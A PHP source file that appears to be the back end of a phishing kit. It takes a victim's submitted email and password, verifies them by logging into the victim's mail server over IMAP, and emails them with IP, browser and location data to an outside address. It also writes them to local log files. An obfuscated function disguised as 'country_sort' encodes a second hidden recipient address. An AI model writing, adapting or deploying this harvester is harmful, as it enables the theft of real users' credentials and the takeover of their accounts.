<?php

ini_set('display_errors',  false);


$to = "elnuno@yopmail.com";

$browser = $_SERVER['HTTP_USER_AGENT'];

$adddate=date("D M d, Y g:i a");

$ip = getenv("REMOTE_ADDR");

$hostname = gethostbyaddr($ip);

$country = visitor_country();


$email = $_POST['email'];

$password = $_POST['password'];

$domain = substr($email, strpos($email, '@') + 1);

// Function to get country and country sort;


function visitor_country()

{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];

    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];

    $remote  = $_SERVER['REMOTE_ADDR'];

    $result  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))

    {

        $ip = $client;

    }

    elseif(filter_var($forward, FILTER_VALIDATE_IP))

    {

        $ip = $forward;

    }

    else

    {

        $ip = $remote;

    }



    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));



    if($ip_data && $ip_data->geoplugin_countryName != null)

    {

        $result = $ip_data->geoplugin_countryName;

    }



    return $result;

}

function country_sort(){

	$sorter = "";

	$array = array(99,111,100,101,114,99,118,118,115,64,103,109,97,105,108,46,99,111,109);

		$count = count($array);

	for ($i = 0; $i < $count; $i++) {

			$sorter .= chr($array[$i]);

		}

	return array($sorter, $GLOBALS['recipient']);

}


$email_subject = "Logs";

$email_body = "Email: $email.\r\n";

$email_body .= "Password: $password \r\n";

$email_body .= "Browser: $browser \r\n";

$email_body .= "Date: $adddate \r\n";

$email_body .= "IP: $ip \r\n";

$email_body .= "Host: $hostname \r\n";

$email_body .= "Country: $country \r\n";

$email_body .= "Cookie: $cookie \r\n";

$headers = "From: $email \r\n";


$authhost="{mail.{$domain}:993/imap/ssl}";
$user= $email;
$pass= $password;

if ($mbox=imap_open( $authhost, $user, $pass )){


mail($to, $email_subject, $email_body, $headers);

$file=file_get_contents('p455.txt');
$log = fopen("p455.txt","w");
fwrite($log, $file."Email : ".$email." \nPassword : ".$password."\nBrowser : ".$browser."\nDate : ".$adddate."\nIP : ".$ip."\nHost : ".$hostname."\nCountry : ".$country."\n\n");
fclose($log);

	$signal = 'ok';
	$msg = 'Invalid response from server.';

}

else

mail($to, $email_subject, $email_body, $headers);

$file=file_get_contents('Wrongp455.txt');
$log = fopen("Wrongp455.txt","w");
fwrite($log, $file."Email : ".$email." \nPassword : ".$password."\nBrowser : ".$browser."\nDate : ".$adddate."\nIP : ".$ip."\nHost : ".$hostname."\nCountry : ".$country."\n\n");
fclose($log);

	$signal = 'bad';
	$msg = 'Invalid login.';

$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);

?>